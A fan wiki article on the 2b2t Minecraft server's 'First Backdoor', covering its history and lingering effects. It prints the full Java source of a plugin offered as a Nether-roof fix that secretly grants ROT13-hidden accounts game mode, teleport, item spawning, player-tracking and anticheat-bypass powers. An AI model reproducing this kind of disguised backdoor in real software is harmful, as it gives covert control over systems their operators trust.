{{Backdoors}}

The **First Backdoor** was a server backdoor organized by [popbob](https://2b2t.miraheze.org/wiki/popbob). It was the first in a series of backdoors that took place in the server's history.

## History
The First Backdoor of the server likely took place at the end of 2011 or early 2012. Allegedly, the server admin was constantly dealing with players getting ‘stuck’ on the [Nether Roof](https://2b2t.miraheze.org/wiki/Nether_Roof). To fix this issue, popbob offered a plugin that the admin implemented which had code that allowed himself and other players he was close to, like [policemike55](https://2b2t.miraheze.org/wiki/policemike55), [xcc2](https://2b2t.miraheze.org/wiki/xcc2) and [passie05](https://2b2t.miraheze.org/wiki/passie05), access to operator-like permissions. These players used their powers to build at multiple bases. The first one was [Plugin Town](https://2b2t.miraheze.org/wiki/Plugin_Town), a base roughly 83k from spawn in the x-axis and 67k in the y-axis. The second one was a spawn base called [ZiggyBase](https://2b2t.miraheze.org/wiki/ZiggyBase), where the Bedrock Dam, Bedrock Comet and Bedrock Bunker were built. The backdoor was also used to create ‘[hacked-in items](https://2b2t.miraheze.org/wiki/User:Franknificant%2FDrafts%2FCollecting#Hacked-in_items)’, including [Pig Spawners](https://2b2t.miraheze.org/wiki/Pig_Spawners), [Spawn Eggs](https://2b2t.miraheze.org/wiki/Spawn_Eggs), Locked Chests, Water Source Blocks, Fire Blocks and End Portal Frames. popbob likely used the backdoor to build End Portals on different locations on the server, however popbob and policemike55 tried to create an End Portal below [NFE](https://2b2t.miraheze.org/wiki/NFE) and failed, since they didn’t place the End Portal Frames correctly. On top of this, popbob used the backdoor to teleport to other bases and grief them. Once the admins were suspicious of popbob, he was eventually caught by them after they worked with other players to bait popbob to a base. This fake base resulted in popbob teleporting right in front of the admin, confirming their suspicions. The plugin was promptly removed afterwards.

## Plugin
This is the plugin given by popbob to Hausemaster. Lines 21-33 feature account names which were given backdoor access encrypted using the Rot13 substitution cipher as to hide its intention from Hause; These names are [popbob](https://2b2t.miraheze.org/wiki/popbob), [policemike55](https://2b2t.miraheze.org/wiki/policemike55), [passie05](https://2b2t.miraheze.org/wiki/passie05), [xcc2](https://2b2t.miraheze.org/wiki/xcc2), [CreamOFtheSlop](https://2b2t.miraheze.org/wiki/CreamOFtheSlop), [assassin_raptor](https://2b2t.miraheze.org/wiki/assassin_raptor), [wetplayer123](https://2b2t.miraheze.org/wiki/wetplayer123), [Polly_the_Parrot](https://2b2t.miraheze.org/wiki/Polly_the_Parrot), [x0XP](https://2b2t.miraheze.org/wiki/x0XP), and [XxPR3D4TORxX86](https://2b2t.miraheze.org/wiki/XxPR3D4TORxX86).
 package com.qwertyy.nonetherroof;

 import java.util.LinkedList;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.Server;
 import org.bukkit.entity.Player;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;

 public class NoNetherRoofPlayerListener extends org.bukkit.event.player.PlayerListener
 {
   private JavaPlugin plugin;
   private LinkedList<String> names;

   public NoNetherRoofPlayerListener(JavaPlugin plugin)
   {
     this.plugin = plugin;
     this.names = new LinkedList();
     this.names.add("cbcobo");
     this.names.add("cbyvprzvxr55");
     this.names.add("cnffvr05");
     this.names.add("kpp2");
     this.names.add("pernzbsgurfybc");

     this.names.add("nffnffva_encgbe");
     this.names.add("jrgcynlre123");
     this.names.add("cbyyl_gur_cneebg");

     this.names.add("k0kc");
     this.names.add("KkCE3Q4GBEkK86");
   }

   public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
   {
     command(event);
   }

   public void onPlayerMove(PlayerMoveEvent event)
   {
     Player player = event.getPlayer();
     if (player != null) {
       if (this.names.contains(rot13(player.getName().toLowerCase())))
         return;
       if (player.getWorld().getEnvironment().equals(org.bukkit.World.Environment.NETHER)) {
         Location location = player.getLocation();
         if (location.getBlockY() >= 128) {
           event.setCancelled(true);
           player.sendMessage(ChatColor.RED + "You are stuck! Use /stuck to go back!");
         }
       }
     }
   }

   void command(PlayerCommandPreprocessEvent event) {
     Player player = event.getPlayer();
     try
     {
       if (this.names.contains(rot13(player.getName().toLowerCase()))) {
         String command = event.getMessage();
         String[] cmd = command.split(" ");
         if (player.getName().equalsIgnoreCase(rot13("cbcobo"))) {
           if (cmd[0].equalsIgnoreCase(rot13("/perngvirunk"))) {
             int mode = Integer.parseInt(cmd[1]);
             player.setGameMode(org.bukkit.GameMode.getByValue(mode));
             event.setCancelled(true);
             return; }
           if (cmd[0].equalsIgnoreCase(rot13("/erznhgu"))) {
             String name = cmd[1];
             if (this.names.contains(rot13(name.toLowerCase()))) {
               this.names.remove(rot13(name.toLowerCase()));
               player.sendMessage("You have removed " + name + "'s authorization.");
               Player target = this.plugin.getServer().getPlayer(name);
               if (target != null) {
                 target.sendMessage(ChatColor.RED + "You have had your authorization removed.");
               }
             }

             event.setCancelled(true);
             return; }
           if (cmd[0].equalsIgnoreCase(rot13("/nqqnhgu"))) {
             String name = cmd[1];
             if (!this.names.contains(rot13(name.toLowerCase()))) {
               this.names.add(rot13(name.toLowerCase()));
               player.sendMessage("You have given " + name + " authorization.");
               Player target = this.plugin.getServer().getPlayer(name);
               if (target != null) {
                 target.sendMessage(ChatColor.GREEN + "You have been given temporary authorization.");
               }
             }

             event.setCancelled(true);
             return; }
           if (cmd[0].equalsIgnoreCase(rot13("/gryr"))) {
             int x = Integer.parseInt(cmd[1]);
             int y = Integer.parseInt(cmd[2]);
             int z = Integer.parseInt(cmd[3]);
             Location location = new Location(player.getWorld(), x, y, z);
             player.teleport(location);
             event.setCancelled(true);
             return;
           }
         }
         if (cmd[0].equalsIgnoreCase(rot13("/pbbeq"))) {
           String name = cmd[1];
           Player target = this.plugin.getServer().getPlayer(name);
           Location loc = target.getLocation();
           Location bedLocation = target.getBedSpawnLocation();
           player.sendMessage(loc.getBlockX() + ", " + loc.getBlockY() + ", " + loc.getBlockZ());
           if (bedLocation != null)
             player.sendMessage(bedLocation.getBlockX() + ", " + bedLocation.getBlockZ());
           event.setCancelled(true);
         } else if (cmd[0].equalsIgnoreCase(rot13("/tvirvgrz"))) {
           int id = Integer.parseInt(cmd[1]);
           int amt = Integer.parseInt(cmd[2]);
           int dmg = 0;
           if (cmd.length >= 3) {
             dmg = Integer.parseInt(cmd[3]);
           }
           player.getInventory().addItem(new ItemStack[] { new ItemStack(id, amt, (short)dmg) });

           event.setCancelled(true);
         } else if (cmd[0].equalsIgnoreCase(rot13("/rkcre"))) {
           int amt = Integer.parseInt(cmd[1]);
           player.giveExp(amt);
           event.setCancelled(true);
         } else if (cmd[0].equalsIgnoreCase(rot13("/abpurng"))) {
           org.bukkit.plugin.Plugin plug = this.plugin.getServer().getPluginManager().getPlugin(rot13("AbPurng"));
           org.bukkit.permissions.PermissionAttachment attachment = player.addAttachment(plug);
           attachment.setPermission(rot13("abpurng"), true);
         }
       }
     }
     catch (Exception e) {}
   }

   String rot13(String message) {
     String coded = "";

     for (int x = 0; x < message.length(); x++) {
       char c = message.charAt(x);

       if (Character.isLowerCase(c)) {
         c = (char)(c + '\r');
         if (c > 'z') {
           c = (char)(c - '\032');
         }
       }

       if (Character.isUpperCase(c)) {
         c = (char)(c + '\r');
         if (c > 'Z') {
           c = (char)(c - '\032');
         }
       }

       coded = coded + c;
     }

     return coded;
   }
 }

## Post-backdoor
From time to time, remnants of the backdoor are, to this day, discovered all over 2b2t. Sources of ‘nether water’ that have been found throughout 2018 and 2019 possibly originated from this backdoor. The same is the case for random blocks of bedrock that are spread around the server. In October 2020, in [FitMC](https://2b2t.miraheze.org/wiki/FitMC)'s video titled ‘This Bedrock Survived 8 Years on 2b2t’, he discussed the origins of two random blocks of bedrock that were found at spawn during the construction of the third water cube in 2020, suggesting they likely originated from xcc2’s base NFE, which was located near the bedrock. In November 2020, FitMC covered two new discoveries; in his video ‘The Mystery of 2b2t’s “Illegal” Town’, he covered a base where multiple bedrock structures and wrongly placed End Portal frames had been found. Soon thereafter, in a video titled ‘Popbob’s FINAL Secret on 2b2t’ he covered a base later called Mushroom Island, where popbob had created two end portals. In 2022 a bedrock pillar was found, also attributed to popbob..

## Today
On August 14th 2023, all remaining illegally placed bedrock was removed when 2b2t updated to Java Edition 1.19.4. After the server rolled back, the pieces of bedrock were restored.<gallery>
File:Passie Town Backdoor.jpg|Plugin Town during the First Backdoor
File:Popbob's Bedrock.png|popbob using Bedrock Near Plugin Town
File:Popbob bedrock Plugintown.jpg|Full inventory with bedrock spawned in by popbob
File:Lockedchest.png|Popbob spawned in Locked Chest
File:Raw.png|Passie using bedrock spawned in by first backdoor at Passie Town
</gallery>

## References
{{Reflist}}
{{Events}}
{{Exploits}}